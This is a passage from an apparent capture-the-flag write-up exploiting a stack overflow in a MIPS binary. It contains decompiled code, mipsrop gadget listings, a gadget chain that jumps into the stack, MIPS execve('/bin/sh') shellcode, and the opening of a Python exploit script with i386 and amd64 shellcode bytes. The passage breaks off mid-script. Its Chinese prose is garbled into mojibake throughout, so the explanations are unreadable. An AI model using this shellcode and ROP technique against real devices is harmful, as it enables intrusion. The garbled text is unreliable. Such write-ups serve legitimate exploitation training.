class="token function">sub_414CA0</span><span class="token punctuation">(</span><span class="token string">"ä½ å–œæ¬¢åƒè‹•çš®ğŸ"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">sub_414CA0</span><span class="token punctuation">(</span><span class="token string">"welcome to korey's è‹•çš®æ‘Š"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">sub_414CA0</span><span class="token punctuation">(</span><span class="token string">"You can keep eating endlessly by entering a passphrase."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">sub_4083B0</span><span class="token punctuation">(</span><span class="token string">"your passphrase: "</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">sub_4084C0</span><span class="token punctuation">(</span><span class="token string">"%48s"</span><span class="token punctuation">,</span> v3<span class="token punctuation">)</span><span class="token punctuation">;</span>  v1 <span class="token operator">=</span> <span class="token function">sub_427A60</span><span class="token punctuation">(</span>v3<span class="token punctuation">)</span><span class="token punctuation">;</span>  v2 <span class="token operator">=</span> <span class="token function">sub_4007B0</span><span class="token punctuation">(</span>v3<span class="token punctuation">,</span> v1<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token function">sub_4274A0</span><span class="token punctuation">(</span>v2<span class="token punctuation">,</span> <span class="token string">"5LiJ5YWD5LiA5Liy5Y2B5YWD5LiJ5Liy"</span><span class="token punctuation">)</span> <span class="token punctuation">)</span><span class="token comment">// æ¯”è¾ƒ</span>    <span class="token function">sub_407878</span><span class="token punctuation">(</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                             <span class="token comment">// exit</span>  <span class="token function">sub_414CA0</span><span class="token punctuation">(</span><span class="token string">"Congratulation!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">return</span> <span class="token function">sub_42BE60</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> v4<span class="token punctuation">,</span> <span class="token number">240</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>è¿è¡Œçœ‹ä¸€ä¸‹ï¼Œå¯è§æ˜¯éœ€è¦è¾“å…¥ä¸€ä¸²å¯†ç ï¼š<br><img src="/EXP_FILE/ce749c047765d24c1aa7dd87fa45028d_MD5.jpeg"><br>æŠŠ5LiJ5YWD5LiA5Liy5Y2B5YWD5LiJ5Liyè¾“è¿›å»ï¼Œæ²¡æœ‰é€šè¿‡check</li></ul><p>çœ‹ä¸‹å­—ç¬¦ä¸²ï¼Œæ„Ÿè§‰æ˜¯base64åŠ å¯†<br><img src="/EXP_FILE/4bbd467901effe3b03445b37a4e11c59_MD5.jpeg"></p><p><img src="/EXP_FILE/dc6ebc3814649b8e5b658258efa8cfb1_MD5.jpeg"><br>è§£ç <br><img src="/EXP_FILE/946541adf2a18c94bb7dfaf02042627e_MD5.jpeg"></p><p>æ¥ä¸‹æ¥å°±æ˜¯ä¸€ä¸ªæ ˆæº¢å‡ºäº†ï¼š<code>return (sub_42BE60)(0, v4, 0xF0);</code></p><p>ç”±äºmipsçš„ç‰¹æ®Šæ€§ï¼ŒNXä¿æŠ¤ä¸æ”¯æŒï¼Œäºæ˜¯ret2shellcodeä¾¿æˆä¸ºäº†é€šç”¨æ”»å‡»æ‰‹æ®µ</p><p>é€šè¿‡mipsropæ’ä»¶æ‰¾gadgetï¼š</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">Python<span class="token operator">></span>mipsrop<span class="token punctuation">.</span>tails<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">|</span>  Address     <span class="token operator">|</span>  Action                                              <span class="token operator">|</span>  Control Jump<span class="token operator">|</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">|</span>  <span class="token number">0x0042D418</span>  <span class="token operator">|</span>  move $t9<span class="token punctuation">,</span>$s1                                        <span class="token operator">|</span>  jr    $s1                             <span class="token operator">|</span><span class="token operator">|</span>  <span class="token number">0x0042D42C</span>  <span class="token operator">|</span>  move $t9<span class="token punctuation">,</span>$s1                                        <span class="token operator">|</span>  jr    $s1                             <span class="token operator">|</span><span class="token operator">|</span>  <span class="token number">0x0042D528</span>  <span class="token operator">|</span>  move $t9<span class="token punctuation">,</span>$s1                                        <span class="token operator">|</span>  jr    $s1                             <span class="token operator">|</span><span class="token operator">|</span>  <span class="token number">0x0042D53C</span>  <span class="token operator">|</span>  move $t9<span class="token punctuation">,</span>$s1                                        <span class="token operator">|</span>  jr    $s1                             <span class="token operator">|</span><span class="token operator">|</span>  <span class="token number">0x00431084</span>  <span class="token operator">|</span>  move $t9<span class="token punctuation">,</span>$a2                                        <span class="token operator">|</span>  jr    $a2                             <span class="token operator">|</span><span class="token operator">|</span>  <span class="token number">0x0045C914</span>  <span class="token operator">|</span>  move $t9<span class="token punctuation">,</span>$s3                                        <span class="token operator">|</span>  jr    $s3                             <span class="token operator">|</span><span class="token operator">|</span>  <span class="token number">0x00469C30</span>  <span class="token operator">|</span>  move $t9<span class="token punctuation">,</span>$v0                                        <span class="token operator">|</span>  jr    $v0                             <span class="token operator">|</span><span class="token operator">|</span>  <span class="token number">0x00469C8C</span>  <span class="token operator">|</span>  move $t9<span class="token punctuation">,</span>$v0                                        <span class="token operator">|</span>  jr    $v0                             <span class="token operator">|</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span>Found <span class="token number">8</span> matching gadgetsPython<span class="token operator">></span>mipsrop<span class="token punctuation">.</span>stackfinder<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">|</span>  Address     <span class="token operator">|</span>  Action                                              <span class="token operator">|</span>  Control Jump<span class="token operator">|</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">|</span>  <span class="token number">0x00417170</span>  <span class="token operator">|</span>  addiu $a2<span class="token punctuation">,</span>$sp<span class="token punctuation">,</span><span class="token number">0x44</span><span class="token operator">+</span>var_C                            <span class="token operator">|</span>  jalr  $s2                             <span class="token operator">|</span><span class="token operator">|</span>  <span class="token number">0x004172A0</span>  <span class="token operator">|</span>  addiu $a2<span class="token punctuation">,</span>$sp<span class="token punctuation">,</span><span class="token number">0x44</span><span class="token operator">+</span>var_C                            <span class="token operator">|</span>  jalr  $s2                             <span class="token operator">|</span><span class="token operator">|</span>  <span class="token number">0x00429A1C</span>  <span class="token operator">|</span>  addiu $a1<span class="token punctuation">,</span>$sp<span class="token punctuation">,</span><span class="token number">0x5C</span><span class="token operator">+</span>var_28                           <span class="token operator">|</span>  jalr  $s5                             <span class="token operator">|</span><span class="token operator">|</span>  <span class="token number">0x00429C14</span>  <span class="token operator">|</span>  addiu $a1<span class="token punctuation">,</span>$sp<span class="token punctuation">,</span><span class="token number">0x6C</span><span class="token operator">+</span>var_38                           <span class="token operator">|</span>  jalr  $s2                             <span class="token operator">|</span><span class="token operator">|</span>  <span class="token number">0x00429CA8</span>  <span class="token operator">|</span>  addiu $v0<span class="token punctuation">,</span>$sp<span class="token punctuation">,</span><span class="token number">0x6C</span><span class="token operator">+</span>var_40                           <span class="token operator">|</span>  jalr  $s2                             <span class="token operator">|</span><span class="token operator">|</span>  <span class="token number">0x00429F00</span>  <span class="token operator">|</span>  addiu $v0<span class="token punctuation">,</span>$sp<span class="token punctuation">,</span><span class="token number">0x170</span><span class="token operator">+</span>var_130                         <span class="token operator">|</span>  jalr  $s0                             <span class="token operator">|</span><span class="token operator">|</span>  <span class="token number">0x0042E68C</span>  <span class="token operator">|</span>  addiu $fp<span class="token punctuation">,</span>$sp<span class="token punctuation">,</span><span class="token number">0x438</span><span class="token operator">+</span>var_408                         <span class="token operator">|</span>  jalr  $s2                             <span class="token operator">|</span><span class="token operator">|</span>  <span class="token number">0x0042E840</span>  <span class="token operator">|</span>  addiu $s6<span class="token punctuation">,</span>$sp<span class="token punctuation">,</span><span class="token number">0x420</span><span class="token operator">+</span>var_408                         <span class="token operator">|</span>  jalr  $s1                             <span class="token operator">|</span><span class="token operator">|</span>  <span class="token number">0x0042F140</span>  <span class="token operator">|</span>  addiu $s7<span class="token punctuation">,</span>$sp<span class="token punctuation">,</span><span class="token number">0x440</span><span class="token operator">+</span>var_404                         <span class="token operator">|</span>  jalr  $s5                             <span class="token operator">|</span><span class="token operator">|</span>  <span class="token number">0x0042F178</span>  <span class="token operator">|</span>  addiu $v1<span class="token punctuation">,</span>$sp<span class="token punctuation">,</span><span class="token number">0x440</span><span class="token operator">+</span>var_428                         <span class="token operator">|</span>  jalr  $s6                             <span class="token operator">|</span><span class="token operator">|</span>  <span class="token number">0x00431D44</span>  <span class="token operator">|</span>  addiu $s5<span class="token punctuation">,</span>$sp<span class="token punctuation">,</span><span class="token number">0x60</span><span class="token operator">+</span>var_28                           <span class="token operator">|</span>  jalr  $s4                             <span class="token operator">|</span><span class="token operator">|</span>  <span class="token number">0x0043965C</span>  <span class="token operator">|</span>  addiu $a2<span class="token punctuation">,</span>$sp<span class="token punctuation">,</span><span class="token number">0x68</span><span class="token operator">+</span>var_10                           <span class="token operator">|</span>  jalr  $fp                             <span class="token operator">|</span><span class="token operator">|</span>  <span class="token number">0x0043D8F0</span>  <span class="token operator">|</span>  addiu $a2<span class="token punctuation">,</span>$sp<span class="token punctuation">,</span><span class="token number">0x88</span><span class="token operator">+</span>var_C                            <span class="token operator">|</span>  jalr  $s1                             <span class="token operator">|</span><span class="token operator">|</span>  <span class="token number">0x00441C14</span>  <span class="token operator">|</span>  addiu $v1<span class="token punctuation">,</span>$sp<span class="token punctuation">,</span><span class="token number">0x138</span><span class="token operator">+</span>var_104                         <span class="token operator">|</span>  jalr  $s0                             <span class="token operator">|</span><span class="token operator">|</span>  <span class="token number">0x0044C9CC</span>  <span class="token operator">|</span>  addiu $a1<span class="token punctuation">,</span>$sp<span class="token punctuation">,</span><span class="token number">0x458</span><span class="token operator">+</span>var_18                          <span class="token operator">|</span>  jalr  $s2                             <span class="token operator">|</span><span class="token operator">|</span>  <span class="token number">0x0044CA0C</span>  <span class="token operator">|</span>  addiu $a0<span class="token punctuation">,</span>$sp<span class="token punctuation">,</span><span class="token number">0x458</span><span class="token operator">+</span>var_2C                          <span class="token operator">|</span>  jalr  $fp                             <span class="token operator">|</span><span class="token operator">|</span>  <span class="token number">0x0044CA44</span>  <span class="token operator">|</span>  addiu $a0<span class="token punctuation">,</span>$sp<span class="token punctuation">,</span><span class="token number">0x458</span><span class="token operator">+</span>var_18                          <span class="token operator">|</span>  jalr  $fp                             <span class="token operator">|</span><span class="token operator">|</span>  <span class="token number">0x0045C98C</span>  <span class="token operator">|</span>  addiu $a1<span class="token punctuation">,</span>$sp<span class="token punctuation">,</span><span class="token number">0x60</span><span class="token operator">+</span>var_28                           <span class="token operator">|</span>  jalr  $s4                             <span class="token operator">|</span><span class="token operator">|</span>  <span class="token number">0x0046C828</span>  <span class="token operator">|</span>  addiu $a1<span class="token punctuation">,</span>$sp<span class="token punctuation">,</span><span class="token number">0xC4</span><span class="token operator">+</span>var_98                           <span class="token operator">|</span>  jalr  $s6                             <span class="token operator">|</span><span class="token operator">|</span>  <span class="token number">0x00422B18</span>  <span class="token operator">|</span>  addiu $a0<span class="token punctuation">,</span>$sp<span class="token punctuation">,</span><span class="token number">0x40</span><span class="token operator">+</span>var_8                            <span class="token operator">|</span>  jalr  $v0                             <span class="token operator">|</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span>Found <span class="token number">20</span> matching gadgets<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>å…ˆçœ‹çœ‹æ ˆå›æº¯æ—¶çš„æ±‡ç¼–ï¼š<br><img src="/EXP_FILE/ee49ea2220b52a55a010b5c3ccb10eba_MD5.jpeg"><br><img src="/EXP_FILE/9eb2fdfa241a2e336adb5cbab750dcbf_MD5.jpeg"><br>å¯è§åœ¨æ ˆå›æº¯æ—¶å–å‡ºäº†å¯„å­˜å™¨çš„å¤‡ä»½ï¼šraã€fpè¿›è¡Œæ¢å¤ï¼Œå¹¶æŠŠspæŠ¬é«˜äº†0x98ï¼ˆä¸‹é¢ç»Ÿä¸€ç§°ä¸ºspâ€™ï¼‰</p><p>å…³æ³¨è¿™ä¸¤ä¸ªgadgetï¼šæˆ‘ä»¬å¯ä»¥æŠŠgadget1æ”¾å…¥$raï¼Œgadget2æ”¾å…¥$fp</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token number">1</span><span class="token operator">|</span>  <span class="token number">0x0043965C</span>  <span class="token operator">|</span>  addiu $a2<span class="token punctuation">,</span>$sp<span class="token punctuation">,</span><span class="token number">0x68</span><span class="token operator">+</span>var_10                           <span class="token operator">|</span>  jalr  $fp<span class="token number">2</span><span class="token operator">|</span>  <span class="token number">0x0040ABB8</span>  <span class="token operator">|</span>  move $t9<span class="token punctuation">,</span>$a2                                        <span class="token operator">|</span>  jalr  $a2   <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>æ‰§è¡Œå®Œgadget1åï¼Œa2 &#x3D; spâ€™+0x68-0x10 &#x3D; spâ€™+0x58 &#x3D; sp+0xf0ï¼Œç„¶åä¼šè·³è½¬åˆ°fpï¼Œå³gadget2ã€‚å†è·³è½¬åˆ°a2ï¼Œå³è·³è½¬åˆ°sp+0xf0å¤„</p><p>æˆ‘ä»¬çš„è¾“å…¥ç‚¹åœ¨sp+0x50ï¼Œå¯è¾“å…¥0xf0å­—èŠ‚ï¼Œå› æ­¤shellcodeé•¿åº¦æœ€å¤šä¸º0xf0-0xa0&#x3D;0x50å­—èŠ‚ã€‚</p><p>shellcraftç”Ÿæˆçš„shellcodeæœ‰ç‚¹é•¿ï¼Œæ‰¾äº†ä¸€ä¸ªshellcodeï¼Œæ±‡ç¼–ã€é“¾æ¥åæå–æœºå™¨ç </p><pre class="line-numbers language-asm" data-language="asm"><code class="language-asm">.section .text.globl __start.set noreorder__start:li $a2,0x111p:bltzal $a2,pli $a2,0 addiu $sp,$sp,-32addiu $a0,$ra,20li $a1,0li $v0,4011syscallsc:    .byte 0x2f,0x62,0x69,0x6e,0x2f,0x73,0x68<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="/EXP_FILE/442ad21d8c3863ab8db1731baebb0834_MD5.jpeg"></p><h3 id="EXP-1"><a href="#EXP-1" class="headerlink" title="EXP"></a>EXP</h3><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment"># !/usr/bin/env python3</span><span class="token comment"># -*- coding: utf-8 -*-</span><span class="token comment">#@Author:X1NRI</span>she_i386_20<span class="token operator">=</span><span class="token string">b"\x31\xc9\x6a\x0b\x58\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80"</span>she_amd64_30<span class="token operator">=</span><span class="token string">b"\x48\x31\xd2\x48\xbb\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x48\xc1\xeb\x08\x53\x48\x89\xe7\x50\x57\x48\x89\xe6\xb0\x3b\x0f\x05"</span>s <span class="token operator">=</span> <span class="token keyword">lambda</span> payload<span class="token punctuation">:</span>io<span class="token punctuation">.</span>send<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>sl   <span class="token operator">=</span> <span class="token keyword">lambda</span> payload<span class="token punctuation">:</span>io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>sa   <span class="token operator">=</span> <span class="token keyword">lambda</span> data<span class="token punctuation">,</span>payload<span class="token punctuation">:</span>io<span class="token punctuation">.</span>sendafter<span class="token punctuation">(</span>data<span class="token punctuation">,</span>payload<span class="token punctuation">)</span>sla  <span class="token operator">=</span> <span class="token keyword">lambda</span> data<span class="token punctuation">,</span>payload<span class="token punctuation">:</span>io<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span>data<span class="token punctuation">,</span>payload<span class="token punctuation">)</span>r    <span class="token operator">=</span> <span class="token keyword">lambda</span> num   <span class="token punctuation">:</span>io<span class="token punctuation">.</span>recv<span class="token punctuation">(</span>numb<span class="token operator">=</span>num<span class="token punctuation">)</span>ru   <span class="token operator">=</span> <span class="token keyword">lambda</span> data<span class="token punctuation">,</span>DROP<span class="token punctuation">:</span>io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span>data<span class="token punctuation">,</span>drop<span class="token operator">=</span>DROP<span class="token punctuation">)</span>rl <span class="token operator">=</span> <span class="token keyword">lambda</span> <span class="token punctuation">:</span>io<span class="token punctuation">.</span>recvline<span class="token punctuation">(</span>keepends<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">)</span>uu32 <span class="token operator">=</span> <span class="token keyword">lambda</span> <span class="token punctuation">:</span>u32<span class="token punctuation">(</span>io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">b'\xf7'</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">4</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token string">b"\x00"</span><span class="token punctuation">)</span> <span class="token punctuation">)</span> uu64 <span class="token operator">=</span> <span class="token keyword">lambda</span> <span class="token punctuation">:</span>u64<span class="token punctuation">(</span>io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">b'\x7f'</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">6</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token string">b"\x00"</span><span class="token punctuation">)</span> <span class="token punctuation">)</span>ep <span class="token operator">=</span> <span class="token keyword">lambda</span> data <span class="token 